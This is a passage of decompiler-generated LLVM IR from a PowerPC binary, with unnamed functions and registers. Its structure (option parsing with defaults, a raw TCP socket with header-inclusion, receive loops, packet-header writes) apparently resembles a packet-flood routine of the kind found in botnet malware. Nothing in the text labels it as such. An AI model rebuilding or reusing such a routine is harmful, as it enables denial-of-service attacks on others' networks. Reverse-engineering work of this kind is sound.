  store i32 %v0_10003028, i32* @r4, align 4
  %v0_1000302c = call i32 @function_10006544()
  store i32 %v0_1000302c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10002ef8

; uselistorder directives
  uselistorder i32 %v0_1000300c, { 1, 0 }
  uselistorder i32 %v0_10002ffc, { 1, 0 }
  uselistorder i32 %v1_10002ff0, { 1, 0 }
  uselistorder i32 %v1_10002fe4, { 1, 0 }
  uselistorder i32 %v0_10002fdc, { 1, 0 }
  uselistorder i32 %v1_10002fd4, { 1, 0 }
  uselistorder i32 %v0_10002f9c, { 2, 1, 0 }
  uselistorder i1 %v1_10002f88, { 1, 0 }
  uselistorder i1 %v0_10002f88, { 1, 0 }
  uselistorder i32 %v1_10002f78, { 0, 3, 2, 4, 1 }
  uselistorder i32 %v2_10002f54, { 0, 2, 1, 3 }
  uselistorder i32 %v4_10002f34, { 1, 0 }
  uselistorder i32 %v0_10002eb8, { 2, 1, 0 }
  uselistorder i32 %v4_10002e9c, { 1, 0, 2 }
  uselistorder i32 %v1_10002e98, { 1, 0 }
  uselistorder i32 %v1_10002de8, { 1, 0 }
  uselistorder i32 %v1_10002d30, { 1, 0 }
  uselistorder i32 %v1_10002d24, { 1, 0 }
  uselistorder i32 %v1_10002cc0, { 1, 0 }
  uselistorder i32 %v0_10002cc0, { 1, 2, 3, 0 }
  uselistorder i32 %v1_10002cb0, { 1, 2, 0 }
  uselistorder i32 %v0_10002ca4, { 1, 0 }
  uselistorder i32 %v5_10002c50, { 0, 3, 1, 2 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 8, 9, 21, 22 }
  uselistorder i32* %r31.global-to-local, { 0, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 1, 2, 3, 4, 16 }
  uselistorder i32* %r30.global-to-local, { 0, 1, 3, 4, 5, 6, 7, 9, 8, 10, 2, 11, 12 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 1, 22, 15, 16, 17, 18, 19, 20, 21, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 0, 2 }
  uselistorder i32* %r29.global-to-local, { 1, 0, 2, 3, 4, 8, 5, 6, 7 }
  uselistorder i32* %r21.global-to-local, { 0, 1, 4, 2, 3, 5, 6, 7, 8, 9 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 26, 22, 23, 24, 25, 12, 27, 28, 29, 30, 31 }
  uselistorder i1* %cr7_eq.global-to-local, { 0, 1, 2, 7, 3, 4, 5, 6, 8, 9, 10, 11, 12, 13 }
  uselistorder i1* %cr4_eq.global-to-local, { 1, 0, 2 }
  uselistorder i1* %cr3_eq.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i8 47, { 12, 13, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23 }
  uselistorder label %dec_label_pc_10003024, { 1, 0 }
  uselistorder label %dec_label_pc_10002ef8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10002e84, { 1, 0 }
  uselistorder label %dec_label_pc_10002e80, { 1, 0 }
  uselistorder label %dec_label_pc_10002e64, { 1, 0 }
  uselistorder label %dec_label_pc_10002e00, { 1, 0 }
  uselistorder label %dec_label_pc_10002dd4, { 1, 0 }
  uselistorder label %dec_label_pc_10002d74, { 1, 0 }
}

define i32 @function_10003034(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10003034:
  %cr2_eq.global-to-local = alloca i1, align 1
  %cr3_eq.global-to-local = alloca i1, align 1
  %cr3_lt.global-to-local = alloca i1, align 1
  %cr4_eq.global-to-local = alloca i1, align 1
  %cr7_eq.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r19.global-to-local = alloca i32, align 4
  %r20.global-to-local = alloca i32, align 4
  %r21.global-to-local = alloca i32, align 4
  %r22.global-to-local = alloca i32, align 4
  %r23.global-to-local = alloca i32, align 4
  %r24.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp13 = call i16 @__decompiler_undefined_function_1()
  %tmp14 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-404 = alloca i32, align 4
  %stack_var_-384 = alloca i32, align 4
  %stack_var_-368 = alloca i32, align 4
  %stack_var_-408 = alloca i32, align 4
  %v0_10003038 = load i32, i32* @lr, align 4
  store i32 %v0_10003038, i32* %r0.global-to-local, align 4
  %v0_1000303c = call i32 @__asm_mfcr()
  store i32 %v0_1000303c, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r20.global-to-local, align 4
  %v0_1000304c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1000303c, i32* %r21.global-to-local, align 4
  %v0_10003084 = load i32, i32* @r28, align 4
  store i32 %arg4, i32* @r28, align 4
  %v0_1000308c = load i32, i32* @r29, align 4
  store i32 %arg3, i32* @r29, align 4
  store i32 268447912, i32* @lr, align 4
  %v2_100030a4 = call i32 @function_10008ec0(i32 16, i32 16)
  store i32 %v2_100030a4, i32* %r22.global-to-local, align 4
  %v0_100030b0 = load i32, i32* %r21.global-to-local, align 4
  store i32 %v0_100030b0, i32* %r3.global-to-local, align 4
  store i32 268447928, i32* @lr, align 4
  %v2_100030b4 = call i32 @function_10008ec0(i32 %v0_100030b0, i32 4)
  %v0_100030b8 = load i32, i32* @r28, align 4
  store i32 %v2_100030b4, i32* %r23.global-to-local, align 4
  %v0_100030c8 = load i32, i32* @r29, align 4
  store i32 %v0_100030c8, i32* %r3.global-to-local, align 4
  store i32 268447952, i32* @lr, align 4
  %v4_100030cc = inttoptr i32 %v0_100030b8 to i32*
  %v5_100030cc = call i32 @function_100021c0(i32 %v0_100030c8, i32* %v4_100030cc, i32 2, i32 0)
  %v5_100030dc = trunc i32 %v5_100030cc to i8
  %v0_100030e4 = load i32, i32* @r28, align 4
  %v0_100030e8 = load i32, i32* @r29, align 4
  store i32 %v0_100030e8, i32* %r3.global-to-local, align 4
  store i32 268447984, i32* @lr, align 4
  %v4_100030ec = inttoptr i32 %v0_100030e4 to i32*
  %v5_100030ec = call i32 @function_100021c0(i32 %v0_100030e8, i32* %v4_100030ec, i32 3, i32 65535)
  %v0_100030f0 = load i32, i32* @r28, align 4
  store i32 %v5_100030ec, i32* @r31, align 4
  %v0_10003100 = load i32, i32* @r29, align 4
  store i32 %v0_10003100, i32* %r3.global-to-local, align 4
  store i32 268448008, i32* @lr, align 4
  %v4_10003104 = inttoptr i32 %v0_100030f0 to i32*
  %v5_10003104 = call i32 @function_100021c0(i32 %v0_10003100, i32* %v4_10003104, i32 4, i32 64)
  %v0_10003108 = load i32, i32* @r28, align 4
  %v5_10003114 = trunc i32 %v5_10003104 to i8
  %v0_1000311c = load i32, i32* @r29, align 4
  store i32 %v0_1000311c, i32* %r3.global-to-local, align 4
  store i32 268448036, i32* @lr, align 4
  %v4_10003120 = inttoptr i32 %v0_10003108 to i32*
  %v5_10003120 = call i32 @function_100021c0(i32 %v0_1000311c, i32* %v4_10003120, i32 5, i32 1)
  %v1_10003128 = urem i32 %v5_10003120, 256
  %v0_10003134 = load i32, i32* @r28, align 4
  %v0_1000313c = load i32, i32* @r29, align 4
  store i32 %v0_1000313c, i32* %r3.global-to-local, align 4
  store i32 268448068, i32* @lr, align 4
  %v4_10003140 = inttoptr i32 %v0_10003134 to i32*
  %v5_10003140 = call i32 @function_100021c0(i32 %v0_1000313c, i32* %v4_10003140, i32 7, i32 65535)
  %v0_10003144 = load i32, i32* @r28, align 4
  %v5_10003150 = trunc i32 %v5_10003140 to i16
  %v0_10003158 = load i32, i32* @r29, align 4
  store i32 %v0_10003158, i32* %r3.global-to-local, align 4
  store i32 268448096, i32* @lr, align 4
  %v4_1000315c = inttoptr i32 %v0_10003144 to i32*
  %v5_1000315c = call i32 @function_100021c0(i32 %v0_10003158, i32* %v4_1000315c, i32 11, i32 0)
  %v0_10003160 = load i32, i32* @r28, align 4
  %v1_10003164 = urem i32 %v5_1000315c, 256
  %v0_10003174 = load i32, i32* @r29, align 4
  store i32 %v0_10003174, i32* %r3.global-to-local, align 4
  store i32 268448124, i32* @lr, align 4
  %v4_10003178 = inttoptr i32 %v0_10003160 to i32*
  %v5_10003178 = call i32 @function_100021c0(i32 %v0_10003174, i32* %v4_10003178, i32 12, i32 1)
  %v0_1000317c = load i32, i32* @r28, align 4
  %v1_10003188 = urem i32 %v5_10003178, 256
  %v0_1000318c = load i32, i32* @r29, align 4
  store i32 %v0_1000318c, i32* %r3.global-to-local, align 4
  store i32 268448148, i32* @lr, align 4
  %v4_10003190 = inttoptr i32 %v0_1000317c to i32*
  %v5_10003190 = call i32 @function_100021c0(i32 %v0_1000318c, i32* %v4_10003190, i32 13, i32 1)
  %v0_10003194 = load i32, i32* @r28, align 4
  %v1_100031a0 = urem i32 %v5_10003190, 256
  %v0_100031a4 = load i32, i32* @r29, align 4
  store i32 %v0_100031a4, i32* %r3.global-to-local, align 4
  store i32 268448172, i32* @lr, align 4
  %v4_100031a8 = inttoptr i32 %v0_10003194 to i32*
  %v5_100031a8 = call i32 @function_100021c0(i32 %v0_100031a4, i32* %v4_100031a8, i32 14, i32 0)
  %v0_100031ac = load i32, i32* @r28, align 4
  %v1_100031b8 = urem i32 %v5_100031a8, 256
  %v0_100031bc = load i32, i32* @r29, align 4
  store i32 %v0_100031bc, i32* %r3.global-to-local, align 4
  store i32 268448196, i32* @lr, align 4
  %v4_100031c0 = inttoptr i32 %v0_100031ac to i32*
  %v5_100031c0 = call i32 @function_100021c0(i32 %v0_100031bc, i32* %v4_100031c0, i32 15, i32 0)
  %v0_100031c4 = load i32, i32* @r28, align 4
  %v1_100031d0 = urem i32 %v5_100031c0, 256
  %v0_100031d4 = load i32, i32* @r29, align 4
  store i32 %v0_100031d4, i32* %r3.global-to-local, align 4
  store i32 268448220, i32* @lr, align 4
  %v4_100031d8 = inttoptr i32 %v0_100031c4 to i32*
  %v5_100031d8 = call i32 @function_100021c0(i32 %v0_100031d4, i32* %v4_100031d8, i32 16, i32 0)
  %v0_100031e4 = load i32, i32* @r28, align 4
  %v1_100031e8 = urem i32 %v5_100031d8, 256
  %v0_100031ec = load i32, i32* @r29, align 4
  store i32 %v0_100031ec, i32* %r3.global-to-local, align 4
  store i32 268448244, i32* @lr, align 4
  %v4_100031f0 = inttoptr i32 %v0_100031e4 to i32*
  %v5_100031f0 = call i32 @function_100021c0(i32 %v0_100031ec, i32* %v4_100031f0, i32 0, i32 768)
  %v0_100031f4 = load i32, i32* @r28, align 4
  store i32 %v5_100031f0, i32* %r25.global-to-local, align 4
  %v0_10003204 = load i32, i32* @r29, align 4
  store i32 %v0_10003204, i32* %r3.global-to-local, align 4
  store i32 268448268, i32* @lr, align 4
  %v4_10003208 = inttoptr i32 %v0_100031f4 to i32*
  %v5_10003208 = call i32 @function_100021c0(i32 %v0_10003204, i32* %v4_10003208, i32 1, i32 1)
  %v1_10003210 = urem i32 %v5_10003208, 256
  store i32 %v1_10003210, i32* %r27.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268448288, i32* @lr, align 4
  %v3_1000321c = call i32 @function_10008b34(i32 2, i32 3, i32 6)
  store i32 %v3_1000321c, i32* %r3.global-to-local, align 4
  %v3_10003220 = icmp eq i32 %v3_1000321c, -1
  store i1 %v3_10003220, i1* %cr7_eq.global-to-local, align 1
  store i32 %v3_1000321c, i32* %r24.global-to-local, align 4
  br i1 %v3_10003220, label %dec_label_pc_100033e0, label %dec_label_pc_1000322c

dec_label_pc_1000322c:                            ; preds = %dec_label_pc_10003034
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_10003238 = ptrtoint i32* %stack_var_-408 to i32
  store i32 4, i32* %r7.global-to-local, align 4
  store i32 1, i32* %stack_var_-408, align 4
  store i32 268448328, i32* @lr, align 4
  %v5_10003244 = call i32 @function_10008af8(i32 0, i32 3, i32 %v2_10003238, i32 4, i32 4)
  store i32 %v5_10003244, i32* %r3.global-to-local, align 4
  %v3_10003248 = icmp eq i32 %v5_10003244, -1
  store i1 %v3_10003248, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10003248, label %dec_label_pc_100033d8, label %dec_label_pc_10003250

dec_label_pc_10003250:                            ; preds = %dec_label_pc_1000322c
  %v0_10003250 = load i32, i32* %r21.global-to-local, align 4
  %v1_10003250 = icmp slt i32 %v0_10003250, 0
  %v3_10003250 = icmp eq i32 %v0_10003250, 0
  store i1 %v1_10003250, i1* %cr3_lt.global-to-local, align 1
  store i1 %v3_10003250, i1* %cr3_eq.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-408, align 4
  %v0_1000325c = load i32, i32* @r31, align 4
  %v1_1000325c = urem i32 %v0_1000325c, 65536
  store i32 %v1_1000325c, i32* %r19.global-to-local, align 4
  %tmp49 = icmp slt i32 %v0_10003250, 1
  br i1 %tmp49, label %dec_label_pc_10003578, label %dec_label_pc_10003264

dec_label_pc_10003264:                            ; preds = %dec_label_pc_10003250
  %v4_10003264 = sext i16 %v5_10003150 to i32
  store i32 %v4_10003264, i32* %r9.global-to-local, align 4
  store i32 65535, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cr4_eq.global-to-local, align 1
  %v2_10003308 = ptrtoint i32* %stack_var_-368 to i32
  %v2_10003314 = ptrtoint i32* %stack_var_-384 to i32
  %v2_10003318 = ptrtoint i32* %stack_var_-404 to i32
  %v4_10003350 = zext i16 %tmp13 to i32
  %v1_10003380 = and i32 %tmp, 1179648
  %v3_10003494 = icmp eq i32 %v1_10003128, 0
  %v4_100034b4 = sext i8 %v5_100030dc to i32
  %v4_100034bc = sext i8 %v5_10003114 to i32
  %v1_10003384 = and i32 %tmp, 327680
  %v3_10003384 = icmp eq i32 %v1_10003384, 0
  %v4_1000338c = icmp eq i32 %v1_10003380, 1179648
  br label %dec_label_pc_10003270

dec_label_pc_10003270:                            ; preds = %dec_label_pc_10003564, %dec_label_pc_10003398, %dec_label_pc_10003264
  %v0_10003270 = load i32, i32* %r25.global-to-local, align 4
  %v1_10003270 = add i32 %v0_10003270, 40
  store i32 %v1_10003270, i32* %r26.global-to-local, align 4
  br label %dec_label_pc_10003274

dec_label_pc_10003274:                            ; preds = %dec_label_pc_10003370, %dec_label_pc_10003270
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268448388, i32* @lr, align 4
  %v3_10003280 = call i32 @function_10008b34(i32 2, i32 1, i32 0)
  store i32 %v3_10003280, i32* %r3.global-to-local, align 4
  %v3_10003284 = icmp eq i32 %v3_10003280, -1
  store i1 %v3_10003284, i1* %cr7_eq.global-to-local, align 1
  store i32 %v3_10003280, i32* %r28.global-to-local, align 4
  br i1 %v3_10003284, label %dec_label_pc_10003564, label %dec_label_pc_10003290

dec_label_pc_10003290:                            ; preds = %dec_label_pc_10003274
  store i32 3, i32* @r4, align 4
  store i32 268448416, i32* @lr, align 4
  %v1_1000329c = call i32 @function_10007c38(i32 3)
  store i32 4, i32* @r4, align 4
  %v0_100032a8 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_100032a8, i32* %r3.global-to-local, align 4
  store i32 268448436, i32* @lr, align 4
  %v2_100032b0 = call i32 @function_10007c38(i32 %v0_100032a8)
  store i32 %v2_100032b0, i32* %r3.global-to-local, align 4
  %v3_100032b4 = load i32, i32* %stack_var_-408, align 4
  store i32 2, i32* %r9.global-to-local, align 4
  %v1_100032bc = mul i32 %v3_100032b4, 24
  store i32 %v1_100032bc, i32* %r0.global-to-local, align 4
  %v0_100032c4 = load i32, i32* %r20.global-to-local, align 4
  %v2_100032c4 = add i32 %v0_100032c4, %v1_100032bc
  store i32 %v2_100032c4, i32* %r11.global-to-local, align 4
  %v1_100032c8 = add i32 %v2_100032c4, 20
  %v2_100032c8 = inttoptr i32 %v1_100032c8 to i8*
  %v3_100032c8 = load i8, i8* %v2_100032c8, align 1
  %v4_100032c8 = zext i8 %v3_100032c8 to i32
  store i32 %v4_100032c8, i32* %r9.global-to-local, align 4
  %v3_100032cc = icmp eq i8 %v3_100032c8, 31
  store i1 %v3_100032cc, i1* %cr7_eq.global-to-local, align 1
  %tmp50 = icmp ult i8 %v3_100032c8, 32
  %v1_100033a4 = add i32 %v2_100032c4, 16
  %v2_100033a4 = inttoptr i32 %v1_100033a4 to i32*
  %v3_100033a4 = load i32, i32* %v2_100033a4, align 4
  br i1 %tmp50, label %dec_label_pc_100033a4, label %dec_label_pc_100032d4

dec_label_pc_100032d4:                            ; preds = %dec_label_pc_10003290
  store i32 %v3_100033a4, i32* %r0.global-to-local, align 4
  %v0_100032dc = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_100032dc, label %dec_label_pc_100033cc, label %dec_label_pc_100032e0

dec_label_pc_100032e0:                            ; preds = %dec_label_pc_100033a4, %dec_label_pc_100032d4
  %stack_var_-396.0 = phi i32 [ %v2_100033c0, %dec_label_pc_100033a4 ], [ %v3_100033a4, %dec_label_pc_100032d4 ]
  store i32 %v4_10003264, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_100032e8

dec_label_pc_100032e8:                            ; preds = %dec_label_pc_100033cc, %dec_label_pc_100032e0
  %stack_var_-396.1 = phi i32 [ %stack_var_-396.2, %dec_label_pc_100033cc ], [ %stack_var_-396.0, %dec_label_pc_100032e0 ]
  %storemerge = phi i16 [ %v1_100033cc, %dec_label_pc_100033cc ], [ %v5_10003150, %dec_label_pc_100032e0 ]
  %v0_100032f0 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_100032f0, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100032f8.67 to i32), i32* @lr, align 4
  %v0_100032f4 = call i32 @function_10008934()
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 268448512, i32* @lr, align 4
  %v0_100032fc = call i32 @function_10008138()
  store i32 %v0_100032fc, i32* %r3.global-to-local, align 4
  store i32 %v0_100032fc, i32* @r31, align 4
  %v4_10003344 = icmp eq i32 %tmp14, %stack_var_-396.1
  %v4_10003354 = zext i16 %storemerge to i32
  %v4_10003358 = icmp eq i16 %storemerge, %tmp13
  %v4_10003344.not = xor i1 %v4_10003344, true
  br label %dec_label_pc_10003304

dec_label_pc_10003304:                            ; preds = %dec_label_pc_10003360, %dec_label_pc_100032e8
  store i32 16, i32* %r0.global-to-local, align 4
  store i32 %v2_10003314, i32* %r7.global-to-local, align 4
  store i32 %v2_10003318, i32* %r8.global-to-local, align 4
  %v0_1000331c = load i32, i32* %r24.global-to-local, align 4
  store i32 %v0_1000331c, i32* %r3.global-to-local, align 4
  store i32 16, i32* %stack_var_-404, align 4
  store i32 268448552, i32* @lr, align 4
  %v6_10003324 = call i32 @function_10008a40(i32 %v0_1000331c, i32 %v2_10003308, i32 256, i32 16384, i32 %v2_10003314, i32 %v2_10003318)
  store i32 %v6_10003324, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_10003330 = icmp eq i32 %v6_10003324, -1
  store i1 %v3_10003330, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10003330, label %dec_label_pc_100033e0, label %dec_label_pc_1000333c

dec_label_pc_1000333c:                            ; preds = %dec_label_pc_10003304
  store i32 %tmp14, i32* %r10.global-to-local, align 4
  store i32 %stack_var_-396.1, i32* %r0.global-to-local, align 4
  store i1 %v4_10003344, i1* %cr7_eq.global-to-local, align 1
  %tmp51 = icmp ult i32 %v6_10003324, 41
  %or.cond = or i1 %tmp51, %v4_10003344.not
  br i1 %or.cond, label %dec_label_pc_10003360, label %dec_label_pc_10003350

dec_label_pc_10003350:                            ; preds = %dec_label_pc_1000333c
  store i32 %v4_10003350, i32* %r0.global-to-local, align 4
  store i32 %v4_10003354, i32* %r8.global-to-local, align 4
  store i1 %v4_10003358, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_10003358, label %dec_label_pc_1000337c, label %dec_label_pc_10003360

dec_label_pc_10003360:                            ; preds = %dec_label_pc_1000333c, %dec_label_pc_10003394, %dec_label_pc_10003350
  store i32 268448612, i32* @lr, align 4
  %v0_10003360 = call i32 @function_10008138()
  %v0_10003364 = load i32, i32* @r31, align 4
  %v2_10003364 = sub i32 %v0_10003360, %v0_10003364
  store i32 %v2_10003364, i32* %r3.global-to-local, align 4
  %v3_10003368 = icmp eq i32 %v2_10003364, 10
  store i1 %v3_10003368, i1* %cr7_eq.global-to-local, align 1
  %tmp52 = icmp slt i32 %v2_10003364, 11
  br i1 %tmp52, label %dec_label_pc_10003304, label %dec_label_pc_10003370

dec_label_pc_10003370:                            ; preds = %dec_label_pc_10003360
  %v0_10003370 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10003370, i32* %r3.global-to-local, align 4
  store i32 268448632, i32* @lr, align 4
  %v0_10003374 = call i32 @function_10007d68()
  store i32 %v0_10003374, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10003274

dec_label_pc_1000337c:                            ; preds = %dec_label_pc_10003350
  store i32 %tmp, i32* %r9.global-to-local, align 4
  store i32 %v1_10003380, i32* %r11.global-to-local, align 4
  store i32 1179648, i32* %r0.global-to-local, align 4
  store i1 %v4_1000338c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_1000338c, label %dec_label_pc_10003440, label %dec_label_pc_10003394

dec_label_pc_10003394:                            ; preds = %dec_label_pc_1000337c
  br i1 %v3_10003384, label %dec_label_pc_10003360, label %dec_label_pc_10003398

dec_label_pc_10003398:                            ; preds = %dec_label_pc_10003394
  %v0_10003398 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10003398, i32* %r3.global-to-local, align 4
  store i32 268448672, i32* @lr, align 4
  %v0_1000339c = call i32 @function_10007d68()
  store i32 %v0_1000339c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10003270

dec_label_pc_100033a4:                            ; preds = %dec_label_pc_10003290
  store i32 %v3_100033a4, i32* %r29.global-to-local, align 4
  %v0_100033a8 = call i32 @function_10006318()
  store i32 %v0_100033a8, i32* %r3.global-to-local, align 4
  %v3_100033ac = load i32, i32* %stack_var_-408, align 4
  %v1_100033b0 = mul i32 %v3_100033ac, 24
  %v1_100033b4 = load i32, i32* %r20.global-to-local, align 4
  %v2_100033b4 = add i32 %v1_100033b4, %v1_100033b0
  store i32 %v2_100033b4, i32* %r9.global-to-local, align 4
  %v1_100033b8 = add i32 %v2_100033b4, 20
  %v2_100033b8 = inttoptr i32 %v1_100033b8 to i8*
  %v3_100033b8 = load i8, i8* %v2_100033b8, align 1
  %v4_100033b8 = zext i8 %v3_100033b8 to i32
  store i32 %v4_100033b8, i32* %r0.global-to-local, align 4
  %tmp53 = urem i8 %v3_100033b8, 64
  %v2_100033bc = zext i8 %tmp53 to i32
  %v3_100033bc = lshr i32 %v0_100033a8, %v2_100033bc
  store i32 %v3_100033bc, i32* %r3.global-to-local, align 4
  %v0_100033c0 = load i32, i32* %r29.global-to-local, align 4
  %v2_100033c0 = add i32 %v3_100033bc, %v0_100033c0
  store i32 %v2_100033c0, i32* %r29.global-to-local, align 4
  %v0_100033c8 = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_100033c8, label %dec_label_pc_100033cc, label %dec_label_pc_100032e0

dec_label_pc_100033cc:                            ; preds = %dec_label_pc_100033a4, %dec_label_pc_100032d4
  %stack_var_-396.2 = phi i32 [ %v2_100033c0, %dec_label_pc_100033a4 ], [ %v3_100033a4, %dec_label_pc_100032d4 ]
  %v0_100033cc = call i32 @function_10006318()
  %v1_100033cc = trunc i32 %v0_100033cc to i16
  store i32 %v0_100033cc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100032e8

dec_label_pc_100033d8:                            ; preds = %dec_label_pc_1000322c
  %v0_100033d8 = load i32, i32* %r24.global-to-local, align 4
  store i32 %v0_100033d8, i32* %r3.global-to-local, align 4
  store i32 268448736, i32* @lr, align 4
  %v0_100033dc = call i32 @function_10007d68()
  store i32 %v0_100033dc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100033e0

dec_label_pc_100033e0:                            ; preds = %dec_label_pc_10003304, %dec_label_pc_10003034, %dec_label_pc_100033d8
  store i32 %v0_1000304c, i32* %r0.global-to-local, align 4
  %v1_100033f4 = call %0 @__asm_mtcrf(i32 56, i32 %v0_1000303c)
  store i32 %v0_10003084, i32* %r28.global-to-local, align 4
  store i32 %v0_1000308c, i32* %r29.global-to-local, align 4
  %v0_1000343c = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000343c

dec_label_pc_10003440:                            ; preds = %dec_label_pc_1000337c
  %v3_10003440 = load i32, i32* %stack_var_-408, align 4
  store i32 %v3_10003440, i32* %r29.global-to-local, align 4
  %v0_10003444 = load i32, i32* %r26.global-to-local, align 4
  store i32 %v0_10003444, i32* @r3, align 4
  %v0_10003448 = load i32, i32* @r30, align 4
  %v1_10003448 = add i32 %v0_10003448, 2
  %v2_10003448 = inttoptr i32 %v1_10003448 to i16*
  %v3_10003448 = load i16, i16* %v2_10003448, align 2
  %v4_10003448 = zext i16 %v3_10003448 to i32
  store i32 %v4_10003448, i32* %r11.global-to-local, align 4
  %v1_1000344c = mul i32 %v3_10003440, 16
  store i32 %v1_1000344c, i32* %r9.global-to-local, align 4
  %v1_10003450 = mul i32 %v3_10003440, 4
  store i32 %v1_10003450, i32* @r29, align 4
  %v1_10003454 = load i32, i32* %r22.global-to-local, align 4
  %v3_10003454 = add i32 %v1_10003454, %v1_1000344c
  %v4_10003454 = inttoptr i32 %v3_10003454 to i32*
  store i32 %tmp14, i32* %v4_10003454, align 4
  %v0_10003458 = load i32, i32* %r22.global-to-local, align 4
  %v1_10003458 = load i32, i32* %r9.global-to-local, align 4
  %v2_10003458 = add i32 %v1_10003458, %v0_10003458
  store i32 %v2_10003458, i32* %r9.global-to-local, align 4
  %v0_1000345c = load i32, i32* %r8.global-to-local, align 4
  %v1_1000345c = trunc i32 %v0_1000345c to i16
  %v3_1000345c = add i32 %v2_10003458, 14
  %v4_1000345c = inttoptr i32 %v3_1000345c to i16*
  store i16 %v1_1000345c, i16* %v4_1000345c, align 2
  %v0_10003460 = load i32, i32* @r30, align 4
  %v1_10003460 = add i32 %v0_10003460, 4
  %v2_10003460 = inttoptr i32 %v1_10003460 to i32*
  %v3_10003460 = load i32, i32* %v2_10003460, align 4
  store i32 %v3_10003460, i32* %r0.global-to-local, align 4
  %v0_10003464 = load i32, i32* %r11.global-to-local, align 4
  %v1_10003464 = trunc i32 %v0_10003464 to i16
  %v2_10003464 = load i32, i32* %r9.global-to-local, align 4
  %v3_10003464 = add i32 %v2_10003464, 12
  %v4_10003464 = inttoptr i32 %v3_10003464 to i16*
  store i16 %v1_10003464, i16* %v4_10003464, align 2
  %v0_10003468 = load i32, i32* %r0.global-to-local, align 4
  %v1_10003468 = load i32, i32* %r9.global-to-local, align 4
  %v2_10003468 = add i32 %v1_10003468, 4
  %v3_10003468 = inttoptr i32 %v2_10003468 to i32*
  store i32 %v0_10003468, i32* %v3_10003468, align 4
  %v0_1000346c = load i32, i32* @r30, align 4
  %v1_1000346c = add i32 %v0_1000346c, 8
  %v2_1000346c = inttoptr i32 %v1_1000346c to i32*
  %v3_1000346c = load i32, i32* %v2_1000346c, align 4
  store i32 %v3_1000346c, i32* %r0.global-to-local, align 4
  %v1_10003470 = load i32, i32* %r9.global-to-local, align 4
  %v2_10003470 = add i32 %v1_10003470, 8
  %v3_10003470 = inttoptr i32 %v2_10003470 to i32*
  store i32 %v3_1000346c, i32* %v3_10003470, align 4
  store i32 268448888, i32* @lr, align 4
  %v0_10003474 = call i32 @function_10008d68()
  store i32 %v0_10003474, i32* %r3.global-to-local, align 4
  %v3_10003478 = load i32, i32* %stack_var_-408, align 4
  store i32 %v3_10003478, i32* %r0.global-to-local, align 4
  %v1_1000347c = load i32, i32* @r29, align 4
  %v2_1000347c = load i32, i32* %r23.global-to-local, align 4
  %v3_1000347c = add i32 %v2_1000347c, %v1_1000347c
  %v4_1000347c = inttoptr i32 %v3_1000347c to i32*
  store i32 %v0_10003474, i32* %v4_1000347c, align 4
  %v0_10003480 = load i32, i32* %r0.global-to-local, align 4
  %v1_10003480 = mul i32 %v0_10003480, 4
  store i32 %v1_10003480, i32* %r0.global-to-local, align 4
  %v0_10003484 = load i32, i32* %r23.global-to-local, align 4
  %v2_10003484 = add i32 %v0_10003484, %v1_10003480
  %v3_10003484 = inttoptr i32 %v2_10003484 to i32*
  %v4_10003484 = load i32, i32* %v3_10003484, align 4
  store i32 %v4_10003484, i32* @r31, align 4
  store i32 %v1_10003128, i32* %r0.global-to-local, align 4
  %v1_1000348c = inttoptr i32 %v4_10003484 to i32*
  %v2_1000348c = load i32, i32* %v1_1000348c, align 4
  store i32 %v2_1000348c, i32* %r9.global-to-local, align 4
  %v1_10003490 = add i32 %v4_10003484, 20
  store i32 %v1_10003490, i32* @r30, align 4
